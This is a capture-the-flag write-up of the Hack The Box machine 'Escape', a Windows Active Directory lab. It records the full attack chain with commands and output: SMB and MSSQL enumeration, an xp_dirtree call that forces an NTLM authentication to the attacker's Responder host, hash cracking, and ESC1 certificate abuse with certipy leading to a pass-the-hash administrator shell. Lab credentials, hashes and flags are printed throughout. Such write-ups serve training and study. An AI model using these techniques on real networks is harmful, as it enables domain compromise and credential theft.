---
title: Escape
summary: Medium Hack The Box Active Directory machine, written up by Ethan Bauer. Covers SMB (445), MS-SQL (1433), Compromising sql_svc.
date: 2026-03-20
tags: [Hack The Box, Active Directory, Windows]
difficulty: medium
os: Windows
url: https://app.hackthebox.com/machines/Escape
author: Ethan Bauer
author_url: https://github.com/ethanbauer10
source: https://github.com/ethanbauer10/Obsidian/blob/main/HackTheBox/Escape%20%5BAD%5D/Escape%20%5BAD%5D.md
---

# Escape
## Enumeration
### Open ports
```python
nmap -p- --min-rate=2000 -sT 10.129.7.67 -Pn
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-20 15:32 GMT
Nmap scan report for 10.129.7.67
Host is up (0.013s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
1433/tcp  open  ms-sql-s
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49669/tcp open  unknown
49691/tcp open  unknown
49692/tcp open  unknown
49704/tcp open  unknown
49714/tcp open  unknown
49742/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 65.71 seconds
```
### Nmap
```python
nmap -p 53,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389 -A --min-rate=2000 -sT 10.129.7.67 -Pn
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-20 15:37 GMT
Nmap scan report for 10.129.7.67
Host is up (0.013s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-03-20 23:37:34Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
|_ssl-date: 2026-03-20T23:38:54+00:00; +8h00m00s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
|_ssl-date: 2026-03-20T23:38:54+00:00; +8h00m00s from scanner time.
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
|_ssl-date: 2026-03-20T23:38:54+00:00; +8h00m00s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-03-20T23:25:18
|_Not valid after:  2056-03-20T23:25:18
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
|_ssl-date: 2026-03-20T23:38:54+00:00; +8h00m00s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2026-03-20T23:38:54+00:00; +8h00m00s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp open  mc-nmf        .NET Message Framing
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

## SMB (445)
Null authentication is enabled, but cannot list users or access shares
### Guest access
#### Shares
```python
nxc smb dc.sequel.htb -u 'Guest' -p '' --shares
SMB         10.129.7.67     445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.7.67     445    DC               [+] sequel.htb\Guest: 
SMB         10.129.7.67     445    DC               [*] Enumerated shares
SMB         10.129.7.67     445    DC               Share           Permissions     Remark
SMB         10.129.7.67     445    DC               -----           -----------     ------
SMB         10.129.7.67     445    DC               ADMIN$                          Remote Admin
SMB         10.129.7.67     445    DC               C$                              Default share
SMB         10.129.7.67     445    DC               IPC$            READ            Remote IPC
SMB         10.129.7.67     445    DC               NETLOGON                        Logon server share 
SMB         10.129.7.67     445    DC               Public          READ            
SMB         10.129.7.67     445    DC               SYSVOL                          Logon server share
```
#### Users
```python
nxc smb dc.sequel.htb -u 'Guest' -p '' --rid-brute             
SMB         10.129.7.67     445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.7.67     445    DC               [+] sequel.htb\Guest: 
SMB         10.129.7.67     445    DC               498: sequel\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.7.67     445    DC               500: sequel\Administrator (SidTypeUser)
SMB         10.129.7.67     445    DC               501: sequel\Guest (SidTypeUser)
SMB         10.129.7.67     445    DC               502: sequel\krbtgt (SidTypeUser)
SMB         10.129.7.67     445    DC               512: sequel\Domain Admins (SidTypeGroup)
SMB         10.129.7.67     445    DC               513: sequel\Domain Users (SidTypeGroup)
SMB         10.129.7.67     445    DC               514: sequel\Domain Guests (SidTypeGroup)
SMB         10.129.7.67     445    DC               515: sequel\Domain Computers (SidTypeGroup)
SMB         10.129.7.67     445    DC               516: sequel\Domain Controllers (SidTypeGroup)
SMB         10.129.7.67     445    DC               517: sequel\Cert Publishers (SidTypeAlias)
SMB         10.129.7.67     445    DC               518: sequel\Schema Admins (SidTypeGroup)
SMB         10.129.7.67     445    DC               519: sequel\Enterprise Admins (SidTypeGroup)
SMB         10.129.7.67     445    DC               520: sequel\Group Policy Creator Owners (SidTypeGroup)
SMB         10.129.7.67     445    DC               521: sequel\Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.7.67     445    DC               522: sequel\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.129.7.67     445    DC               525: sequel\Protected Users (SidTypeGroup)
SMB         10.129.7.67     445    DC               526: sequel\Key Admins (SidTypeGroup)
SMB         10.129.7.67     445    DC               527: sequel\Enterprise Key Admins (SidTypeGroup)
SMB         10.129.7.67     445    DC               553: sequel\RAS and IAS Servers (SidTypeAlias)
SMB         10.129.7.67     445    DC               571: sequel\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.129.7.67     445    DC               572: sequel\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.129.7.67     445    DC               1000: sequel\DC$ (SidTypeUser)
SMB         10.129.7.67     445    DC               1101: sequel\DnsAdmins (SidTypeAlias)
SMB         10.129.7.67     445    DC               1102: sequel\DnsUpdateProxy (SidTypeGroup)
SMB         10.129.7.67     445    DC               1103: sequel\Tom.Henn (SidTypeUser)
SMB         10.129.7.67     445    DC               1104: sequel\Brandon.Brown (SidTypeUser)
SMB         10.129.7.67     445    DC               1105: sequel\Ryan.Cooper (SidTypeUser)
SMB         10.129.7.67     445    DC               1106: sequel\sql_svc (SidTypeUser)
SMB         10.129.7.67     445    DC               1107: sequel\James.Roberts (SidTypeUser)
SMB         10.129.7.67     445    DC               1108: sequel\Nicole.Thompson (SidTypeUser)
SMB         10.129.7.67     445    DC               1109: sequel\SQLServer2005SQLBrowserUser$DC (SidTypeAlias)
```
From this i have made a userlist which i can use to try things like asrep roasting

AS-REP roasting failed

My next move is to access the `Public` SMB share

### `Public` share
```python
smbclient.py sequel.htb/'Guest':''@dc.sequel.htb
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

Password:
Type help for list of commands
# shares
ADMIN$
C$
IPC$
NETLOGON
Public
SYSVOL
# use Public
# ls
drw-rw-rw-          0  Sat Nov 19 11:51:25 2022 .
drw-rw-rw-          0  Sat Nov 19 11:51:25 2022 ..
-rw-rw-rw-      49551  Sat Nov 19 11:51:25 2022 SQL Server Procedures.pdf
```
Ive transferred this to my machine

Ill take a look in libre office

### SQL Server Procedures.pdf
Found a default username and password
```python
PublicUser:GuestUserCantWrite1
```

Ill test these creds

```python
nxc mssql dc.sequel.htb -u PublicUser -p 'GuestUserCantWrite1' --local-auth 
MSSQL       10.129.7.67     1433   DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:sequel.htb) (EncryptionReq:False)
MSSQL       10.129.7.67     1433   DC               [+] DC\PublicUser:GuestUserCantWrite1
```
This account is just a guest account but this user has access to ms-sql

## MS-SQL (1433)
### Metasploit enum logons
```python
msf auxiliary(admin/mssql/mssql_enum_sql_logins) > run
[*] Running module against 10.129.7.67
[*] 10.129.7.67:1433 - Attempting to connect to the database server at 10.129.7.67:1433 as PublicUser...
[+] 10.129.7.67:1433 - Connected.
[*] 10.129.7.67:1433 - Checking if PublicUser has the sysadmin role...
[*] 10.129.7.67:1433 - PublicUser is NOT a sysadmin.
[*] 10.129.7.67:1433 - Setup to fuzz 300 SQL Server logins.
[*] 10.129.7.67:1433 - Enumerating logins...
[+] 10.129.7.67:1433 - 36 initial SQL Server logins were found.
[*] 10.129.7.67:1433 - Verifying the SQL Server logins...
[+] 10.129.7.67:1433 - 17 SQL Server logins were verified:
[*] 10.129.7.67:1433 -  - ##MS_AgentSigningCertificate##
[*] 10.129.7.67:1433 -  - ##MS_PolicyEventProcessingLogin##
[*] 10.129.7.67:1433 -  - ##MS_PolicySigningCertificate##
[*] 10.129.7.67:1433 -  - ##MS_PolicyTsqlExecutionLogin##
[*] 10.129.7.67:1433 -  - ##MS_SQLAuthenticatorCertificate##
[*] 10.129.7.67:1433 -  - ##MS_SQLReplicationSigningCertificate##
[*] 10.129.7.67:1433 -  - ##MS_SQLResourceSigningCertificate##
[*] 10.129.7.67:1433 -  - ##MS_SmoExtendedSigningCertificate##
[*] 10.129.7.67:1433 -  - BUILTIN\Users
[*] 10.129.7.67:1433 -  - NT AUTHORITY\SYSTEM
[*] 10.129.7.67:1433 -  - NT SERVICE\SQLTELEMETRY$SQLMOCK
[*] 10.129.7.67:1433 -  - NT SERVICE\SQLWriter
[*] 10.129.7.67:1433 -  - NT SERVICE\Winmgmt
[*] 10.129.7.67:1433 -  - NT Service\MSSQL$SQLMOCK
[*] 10.129.7.67:1433 -  - PublicUser
[*] 10.129.7.67:1433 -  - sa
[*] 10.129.7.67:1433 -  - sequel\Administrator
[*] Auxiliary module execution completed
msf auxiliary(admin/mssql/mssql_enum_sql_logins) > 
```
These are all the users with logon to MS-SQL

### All databases
```python
SQL (PublicUser  guest@master)> select name from master..sysdatabases;
name     
------   
master   
tempdb   
model    
msdb
```
These are all the databases on the system

Also something to note is that xp_cmdshell is disabled

After looking through the DBs there is nothing in them

My idea is to try and force a connection from the DB to a SMB share ill setup on my machine

## Compromising `sql_svc`
First ill start Responder

```python
sudo responder -I tun0
```

```python
SQL (PublicUser  guest@master)> EXEC xp_dirtree '\\10.10.14.90\share';
```
This will force a connection back to responder

```python
[SMB] NTLMv2-SSP Client   : 10.129.7.162
[SMB] NTLMv2-SSP Username : sequel\sql_svc
[SMB] NTLMv2-SSP Hash     : sql_svc::sequel:1c7304fad9f1b57f:796233AE76DFA2C01C6408694BAD2AC2:0101000000000000007F20794FB9DC0128921C4A213B82FF00000000020008004E00350037004C0001001E00570049004E002D0045004B0049004B00320047004D003200350032004F0004003400570049004E002D0045004B0049004B00320047004D003200350032004F002E004E00350037004C002E004C004F00430041004C00030014004E00350037004C002E004C004F00430041004C00050014004E00350037004C002E004C004F00430041004C0007000800007F20794FB9DC0106000400020000000800300030000000000000000000000000300000091AB64D9473F92C038B8F29F638CC5760B5A6A1134F91CB62960E3A4C0271210A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00390030000000000000000000
```
I have now captured the hash of the `sql_svc` account

### Cracking the hash
```python
hashcat sql-svc.hash /usr/share/wordlists/rockyou.txt

SQL_SVC::sequel:1c7304fad9f1b57f:796233ae76dfa2c01c6408694bad2ac2:0101000000000000007f20794fb9dc0128921c4a213b82ff00000000020008004e00350037004c0001001e00570049004e002d0045004b0049004b00320047004d003200350032004f0004003400570049004e002d0045004b0049004b00320047004d003200350032004f002e004e00350037004c002e004c004f00430041004c00030014004e00350037004c002e004c004f00430041004c00050014004e00350037004c002e004c004f00430041004c0007000800007f20794fb9dc0106000400020000000800300030000000000000000000000000300000091ab64d9473f92c038b8f29f638cc5760b5a6a1134f91cb62960e3a4c0271210a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00390030000000000000000000:REGGIE1234ronnie
```
I will now test these creds

```python
sql_svc:REGGIE1234ronnie
```

```python
nxc smb dc.sequel.htb -u 'sql_svc' -p 'REGGIE1234ronnie' --shares 
SMB         10.129.7.162    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.7.162    445    DC               [+] sequel.htb\sql_svc:REGGIE1234ronnie 
SMB         10.129.7.162    445    DC               [*] Enumerated shares
SMB         10.129.7.162    445    DC               Share           Permissions     Remark
SMB         10.129.7.162    445    DC               -----           -----------     ------
SMB         10.129.7.162    445    DC               ADMIN$                          Remote Admin
SMB         10.129.7.162    445    DC               C$                              Default share
SMB         10.129.7.162    445    DC               IPC$            READ            Remote IPC
SMB         10.129.7.162    445    DC               NETLOGON        READ            Logon server share 
SMB         10.129.7.162    445    DC               Public          READ            
SMB         10.129.7.162    445    DC               SYSVOL          READ            Logon server share
```
These credentials work

Here is the access i have on `sql_svc` user

```python
nxc winrm dc.sequel.htb -u 'sql_svc' -p 'REGGIE1234ronnie'               
WINRM       10.129.7.162    5985   DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:sequel.htb)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.129.7.162    5985   DC               [+] sequel.htb\sql_svc:REGGIE1234ronnie (Pwn3d!)
```
This user also has access via winrm

### Shell access as `sql_svc`
```python
evil-winrm -i dc.sequel.htb -u sql_svc -p REGGIE1234ronnie
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\sql_svc\Documents>
```
Shell access!

The only other user on the system with a profile is `ryan.cooper`

```python
*Evil-WinRM* PS C:\SQLServer> dir


    Directory: C:\SQLServer


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         2/7/2023   8:06 AM                Logs
d-----       11/18/2022   1:37 PM                SQLEXPR_2019
-a----       11/18/2022   1:35 PM        6379936 sqlexpress.exe
-a----       11/18/2022   1:36 PM      268090448 SQLEXPR_x64_ENU.exe


*Evil-WinRM* PS C:\SQLServer> 
```
Found the SQL server dir

```python
*Evil-WinRM* PS C:\SQLServer\Logs> type ERRORLOG.BAK

2022-11-18 13:43:07.44 Logon       Logon failed for user 'sequel.htb\Ryan.Cooper'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
2022-11-18 13:43:07.48 Logon       Error: 18456, Severity: 14, State: 8.
2022-11-18 13:43:07.48 Logon       Logon failed for user 'NuclearMosquito3'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
```
Looks like ive found a password, ill test if these are valid

## Compromising `ryan.cooper`
```python
nxc ldap dc.sequel.htb -u ryan.cooper -p NuclearMosquito3                                            
LDAP        10.129.7.162    389    DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:sequel.htb) (signing:Enforced) (channel binding:Never)
LDAP        10.129.7.162    389    DC               [+] sequel.htb\ryan.cooper:NuclearMosquito3
```
Another user compromised

```python
nxc winrm dc.sequel.htb -u ryan.cooper -p NuclearMosquito3
'WINRM       10.129.7.162    5985   DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:sequel.htb)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.129.7.162    5985   DC               [+] sequel.htb\ryan.cooper:NuclearMosquito3 (Pwn3d!)
```
This user also has access via WINRM

### Winrm access as `ryan.cooper`
```python
evil-winrm -i dc.sequel.htb -u ryan.cooper -p NuclearMosquito3
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Desktop> dir


    Directory: C:\Users\Ryan.Cooper\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        3/21/2026   5:20 PM             34 user.txt


*Evil-WinRM* PS C:\Users\Ryan.Cooper\Desktop> type user.txt
||9c5ecf10228361a6eb1c55bad139c2e4||
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Desktop> 
```

## ADCS

```python
certipy-ad find -u ryan.cooper@sequel.htb -p 'NuclearMosquito3' -dc-ip 10.129.7.162 -vulnerable -stdout
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Finding issuance policies
[*] Found 15 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'sequel-DC-CA' via RRP
[*] Successfully retrieved CA configuration for 'sequel-DC-CA'
[*] Checking web enrollment for CA 'sequel-DC-CA' @ 'dc.sequel.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : sequel-DC-CA
    DNS Name                            : dc.sequel.htb
    Certificate Subject                 : CN=sequel-DC-CA, DC=sequel, DC=htb
    Certificate Serial Number           : 1EF2FA9A7E6EADAD4F5382F4CE283101
    Certificate Validity Start          : 2022-11-18 20:58:46+00:00
    Certificate Validity End            : 2121-11-18 21:08:46+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : SEQUEL.HTB\Administrators
      Access Rights
        ManageCa                        : SEQUEL.HTB\Administrators
                                          SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        ManageCertificates              : SEQUEL.HTB\Administrators
                                          SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        Enroll                          : SEQUEL.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : UserAuthentication
    Display Name                        : UserAuthentication
    Certificate Authorities             : sequel-DC-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Client Authentication
                                          Secure Email
                                          Encrypting File System
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 10 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2022-11-18T21:10:22+00:00
    Template Last Modified              : 2024-01-19T00:26:38+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Domain Users
                                          SEQUEL.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : SEQUEL.HTB\Administrator
        Full Control Principals         : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        Write Owner Principals          : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        Write Dacl Principals           : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        Write Property Enroll           : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Domain Users
                                          SEQUEL.HTB\Enterprise Admins
    [+] User Enrollable Principals      : SEQUEL.HTB\Domain Users
    [!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.
```
As seen from this output there is a ESC1 vulnerability
### ESC1

First ill start by requesting the administrator account details becuase i will need the admins SID
```python
certipy-ad account -u 'ryan.cooper' -p 'NuclearMosquito3' -dc-ip '10.129.7.162' -user 'administrator' read
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Reading attributes for 'Administrator':
    cn                                  : Administrator
    distinguishedName                   : CN=Administrator,CN=Users,DC=sequel,DC=htb
    name                                : Administrator
    objectSid                           : S-1-5-21-4078382237-1492182817-2568127209-500
    sAMAccountName                      : Administrator
    userAccountControl                  : 1114624
    whenCreated                         : 2022-11-18T17:11:51+00:00
    whenChanged                         : 2026-03-22T00:19:53+00:00
```

```python
certipy-ad req -u 'ryan.cooper@sequel.htb' -p 'NuclearMosquito3' -dc-ip '10.129.7.162' -target 'dc.sequel.htb' -ca 'sequel-DC-CA' -template 'UserAuthentication' -upn 'administrator@sequel.htb' -sid 'S-1-5-21-4078382237-1492182817-2568127209-500'
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 14
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@sequel.htb'
[*] Certificate object SID is 'S-1-5-21-4078382237-1492182817-2568127209-500'
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```
This requested the certificate for administrator

```python
faketime -f +8h certipy-ad auth -pfx 'administrator.pfx' -dc-ip '10.129.7.162'
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@sequel.htb'
[*]     SAN URL SID: 'S-1-5-21-4078382237-1492182817-2568127209-500'
[*] Using principal: 'administrator@sequel.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee
```
So after sinking the time with the DC i can retrieve the NTLM hash of the administrator

```python
evil-winrm -i dc.sequel.htb -u administrator -H 'a52f78e4c751e5f5e17e1e9f3e58f4ee'
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
||fccab775fe2bbd51b04b4782e828c0bc||
*Evil-WinRM* PS C:\Users\Administrator\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== =======
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Enabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeBackupPrivilege                         Back up files and directories                                      Enabled
SeRestorePrivilege                        Restore files and directories                                      Enabled
SeShutdownPrivilege                       Shut down the system                                               Enabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
SeUndockPrivilege                         Remove computer from docking station                               Enabled
SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SeTimeZonePrivilege                       Change the time zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
*Evil-WinRM* PS C:\Users\Administrator\Desktop> 
```
Domain admin and full domain compromise!
